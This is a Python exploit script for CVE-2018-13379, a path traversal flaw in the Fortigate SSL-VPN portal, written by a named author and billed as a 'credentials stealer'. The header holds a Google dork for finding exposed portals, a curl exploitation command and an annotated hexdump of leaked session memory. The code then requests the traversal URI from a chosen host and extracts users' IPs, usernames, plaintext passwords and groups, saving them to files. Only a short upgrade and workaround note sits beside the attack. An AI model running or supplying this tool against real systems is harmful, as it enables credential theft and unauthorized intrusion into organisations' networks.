#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
Date:
  October 21th, 2019

Name:
  CVE-2018-13379 | Fortigate SSL-VPN Credentials Stealer

Version:
  1.2

Description:
  A path traversal vulnerability in the Fortigate SSL-VPN web portal allows
  an unauthenticated attacker to leak users web sessions credentials.
  Work only if SSL-VPN service ("web-mode" or "tunnel-mode") is enabled.

Author:
  iojymbo (@iojymbo)

Credits:
  Orange Tsai (@orange_8361) - DEVCORE
  Meh Chang (@mehqq_) - DEVCORE

Affected Products:
  FortiOS 5.4.6 to 5.4.12
  FortiOS 5.6.3 to 5.6.7
  FortiOS 6.0.0 to 6.0.4

Advisories:
  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379
  https://fortiguard.com/psirt/FG-IR-18-384

References:
  https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/
  https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf

Date of public disclosure:
  May 24th, 2019

Google Dork:
  intitle:"Please Login" intext:"Please Login" inurl:"/remote/login"

Exploitation:
  $ VULN_URI='/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
  $ VULN_URL='https://192.168.0.2:443'${VULN_URI}
  $ curl -k --output 'sslvpn_websession' ${VULN_URL}
  $ xxd sslvpn_websession.bin
  -------------------------------------------------------------------
  00000000: 7661 7220 6667 745f 6c61 6e67 203d 200a  var fgt_lang = .  -> Vulnerable 'fgt_lang' variable
  00000010: 7d71 645e 0000 0000 dfbe 4f00 0000 0000  }qd^......O.....
  00000020: 0400 0000 0000 0000 9003 0000 0000 0000  ................
  00000030: 0100 0000 ff7f 0000 3901 0000 0000 0000  ........9.......
  00000040: 0038 0100 0035 ee06 30cb 0000 0010 0000  .8...5..0.......
  00000050: 0000 0000 0029 e426 5d00 0000 0029 e426  .....).&]....).&
  00000060: 5d00 0000 0029 e426 5d00 0000 0001 3139  ]....).&].....19  -> Web session begin with '01' hex byte
  00000070: 322e 3136 382e 302e 3100 0000 0000 0000  2.168.0.1.......     followed by an IP address
  00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
  00000090: 0000 7670 6e5f 7573 6572 0000 0000 0000  ..vpn_user......  -> Then a username
  000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
  ...
  00000200: 0000 0000 0000 0000 0000 0000 0000 0000  ................
  00000210: 0000 0000 5040 2424 7730 7264 2100 0000  ....P@$$w0rd!...  -> A password
  00000220: 0000 0000 0000 0000 0000 0000 0000 0000  ................
  ...
  000002a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
  000002b0: 0056 504e 5f55 5345 5253 5f47 524f 5550  .VPN_USERS_GROUP  -> And a group (if assigned)
  000002c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
  -------------------------------------------------------------------
  1°) Leak SSL-VPN service memory by requesting this path traversal URI:
      '/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
  2°) Save memory leak for detailed advanced analysis / development purpose,
  3°) Remove empty NULL ('00') bytes from memory leaked,
  4°) Each web session begins with '01' hex byte and user's IP address,
      followed by his username, his password and his group (if assigned),
      so just collect these 4 hex strings !
  5°) Decode collected hex strings,
  6°) Format, save and print result.

Usage:
  $ python CVE-2018-13379.py -r <RHOST> -p <RPORT>
  $ python CVE-2018-13379.py -r 192.168.0.2 -p 443

Tested against:
  FortiOS 5.4.6
  FortiOS 5.6.5
  FortiOS 6.0.0
  FortiOS 6.0.2

Solution:
  Upgrade FortiOS.

Workaround:
  Disable the SSL-VPN service (both "web-mode" and "tunnel-mode").

License:
  Usage is provided under the WTFPL license.

'''

# Import module(s)
import argparse
import re
import requests

# Disable all SSL warnings
try:
  from requests.packages.urllib3.exceptions import InsecureRequestWarning
  requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except Exception:
  pass

# Colors handling
is_colorama_loaded = False
try:
  import colorama
  colorama.init(autoreset=True)
  is_colorama_loaded = True
except:
  pass


class Symbols:
  '''
  Require module(s): colorama.
  '''
  if is_colorama_loaded:
    ask   = colorama.Fore.CYAN    + "[?] " + colorama.Fore.RESET
    done  = colorama.Fore.GREEN   + "[+] " + colorama.Fore.RESET
    error = colorama.Fore.RED     + "[-] " + colorama.Fore.RESET
    info  = colorama.Fore.YELLOW  + "[!] " + colorama.Fore.RESET
    run   = colorama.Fore.BLUE    + "[*] " + colorama.Fore.RESET
  else:
    ask   = "[?] "
    done  = "[+] "
    error = "[-] "
    info  = "[!] "
    run   = "[*] "


class Toolbox:
  '''
  Require module(s): re.
  '''

  def decode_hex_string(self, hex_string):
    '''
    Return decoded hex string.
    '''
    try:
      plain_text = hex_string.decode('hex')
    except:
      plain_text = ''
    return(plain_text)

  def is_valid_ip_address(self, ip_string):
    '''
    Return 'True' if string is an IP address.
    '''
    regex = '^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$'
    return(True) if re.match(regex,ip_string) else (False)

  def is_valid_group_name(self, group_string):
    '''
    Return 'True' if string is a valid group name.
    '''
    regex = '^[a-zA-Z0-9 _-]*$'
    return(True) if (re.match(regex,group_string) and len(group_string) > 2) else (False)

  def format_decoded_websessions(self, websessions_list):
    '''
    Format web session(s) loot and return output.
    '''
    result  = "IP address" + (" " * 7) + "Username(s)" + (" " * 17) + "Password(s)" + (" " * 21) + "Group(s)\n"
    result += "-" * 100 + "\n"
    for websession in websessions_list:
      result += websession[0] + (" " * (17 - len(websession[0])))                  # IP address
      result += websession[1] + (" " * (28 - len(websession[1])))                  # Username
      result += websession[2] + (" " * (32 - len(websession[2].decode('utf-8'))))  # Password
      if len(websession) > 3:                                                      # If group found
        result += websession[3]                                                    # --> Group
      result += "\n"
    return(result)

  def save_decoded_websessions(self, data, filename):
    '''
    Save output to file.
    '''
    file(filename,'w').write(data)


class Exploit:
  '''
  Require module(s): requests.
  '''

  def request_memory_leak(self, host, port):
    '''
    Perform HTTPS request on vulnerable '/remote/fgt_lang?lang=' URI.
    '''
    http_headers = {
      'Accept'          : '*/*',
      'Accept-Encoding' : 'gzip, deflate',
      'Cache-Control'   : 'max-age=0',
      'User-Agent'      : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'
    }
    vuln_uri = '/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
    vuln_url = 'https://' + host + ':' + port + vuln_uri

    try:
      response = requests.request(method='GET', url=vuln_url, headers=http_headers, verify=False, stream=True, timeout=5)
      return(response.raw.read())
    except requests.exceptions.ConnectionError:
      return('')

  def is_vulnerable(self, raw_http_bytes):
    '''
    Check if request response contains 'var fgt_lang =' in the first 64 bytes.
    '''
    return(True) if 'var fgt_lang =' in str(raw_http_bytes[0:63]) else (False)

  def clean_memory_leak(self, raw_http_bytes):
    '''
    Remove empty NULL ('00') bytes and return a list of hex strings.
    '''
    result_list = []
    hex_string  = ''
    for byte in raw_http_bytes:
      hex_code = (hex(ord(byte))[2:]).zfill(2) # Format hex code to 2 digits only; eg: '1A'
      if hex_code == '00':                     # If NULL ('00') hex code
        if hex_string != '':                   # --> If concatened hex string is not empty
          result_list.append(hex_string)       # -----> Append concatened hex codes to result list
        hex_string = ''                        # --> Reset hex string content
      while hex_code != '00':                  # Proceed while no NULL ('00') hex code
        hex_string += hex_code                 # --> Concat hex codes to hex string
        break                                  # --> Go to next hex code
    return(result_list)                        # Return hex strings list

  def extract_vpn_websessions(self, hex_strings_list):
    '''
    Extract each VPN web session from hex strings and return a list of them.
    '''
    result_list         = []
    current_websession  = []
    websession_detected = False
    for hex_strings in hex_strings_list:
      if hex_strings[:2] == '01' and len(hex_strings) >= 14:                        # Each webs ession data begin with '01' hex code, followed by an IP address
        hex_strings = hex_strings[2:]                                               # --> Remove '01' hex code from current hex strings
        if Toolbox().is_valid_ip_address(Toolbox().decode_hex_string(hex_strings)): # --> Is a valid IP address
          websession_detected = True                                                # ------> New VPN web session detected
      while websession_detected == True:                                            # Parse current webs ession data
        decoded_strings = Toolbox().decode_hex_string(hex_strings)                  # --> Decode hex strings
        if len(current_websession) == 3:                                            # --> If IP address, username & password were collected, close current web session
          if Toolbox().is_valid_group_name(hex_strings):                            # ------> Check if current hex strings is a valid group name
            current_websession.append(decoded_strings)                              # ----------> Append group to current web session
          result_list.append(current_websession)                                    # ------> Append web session to result list
          current_websession = []                                                   # ------> Reset current web session content
          websession_detected = False                                               # ------> End of VPN web session
          break                                                                     # ------> Go to next hex strings
        if decoded_strings != '':                                                   # --> If valid data
          current_websession.append(decoded_strings)                                # ------> Append data to current web session
        break                                                                       # --> Go to next hex strings
    return(result_list)


# Main
def main():
  '''
  Require module(s): argparse.
  '''

  # Banner
  print("\n" + "[ CVE-2018-13379 | Fortigate SSL-VPN Credentials Stealer | @iojymbo ]".center(100, '-') + "\n")

  # Declare arguments
  parser = argparse.ArgumentParser()
  parser.add_argument("-r","--remote-host", action='store', dest='rhost', required=True)
  parser.add_argument("-p","--port"       , action='store', dest='rport', required=True)
  args = parser.parse_args()

  # Start attack
  print(Symbols.info + "Targeting %s on port %s" % (args.rhost,args.rport))
  print(Symbols.run  + "Trying to leak remote SSL-VPN service memory...")
  raw_bytes = Exploit().request_memory_leak(args.rhost,args.rport)

  # Check if response contains some valid bytes in memory leak
  if Exploit().is_vulnerable(raw_bytes):
    print(Symbols.done + "Remote SSL-VPN service memory is vulnerable.")
    output_filename = args.rhost + '_' + args.rport + '_websessions.bin'
    print(Symbols.run + "Saving memory leak to \"%s\"..." % (output_filename))
    Toolbox().save_decoded_websessions(raw_bytes,(output_filename))

    print(Symbols.run  + "Cleaning SSL-VPN service memory leak...")
    clean_memory_list = Exploit().clean_memory_leak(raw_bytes)

    print(Symbols.run + "Extracting web session(s) from hex strings...")
    raw_websessions_list = Exploit().extract_vpn_websessions(clean_memory_list)

    # Found web session(s) ?
    if len(raw_websessions_list) >= 1:
      print(Symbols.done + "Found one or more web session(s).")
      print(Symbols.run  + "Formating decoded hex strings...")
      decoded_websessions = Toolbox().format_decoded_websessions(raw_websessions_list)

      output_filename = args.rhost + '_' + args.rport + '_creds.txt'
      print(Symbols.run + "Saving result to \"%s\"..." % (output_filename))
      Toolbox().save_decoded_websessions(decoded_websessions,(output_filename))

      print(Symbols.run + "Printing result...")
      print("-" * 100 + "\n"+ decoded_websessions + "-" * 100)
      print(Symbols.done + "Found %i web session(s). ;)" % (len(decoded_websessions.split('\n'))-3))
    else:
      print(Symbols.error + "Cannot found any web session(s) data!")
  elif raw_bytes == '':
    print(Symbols.error + "Cannot connect to remote host!")
  else:
    print(Symbols.error + "Remote SSL-VPN service memory is not vulnerable!")

# Run main()
if (__name__ == '__main__'):
  main()
  quit()

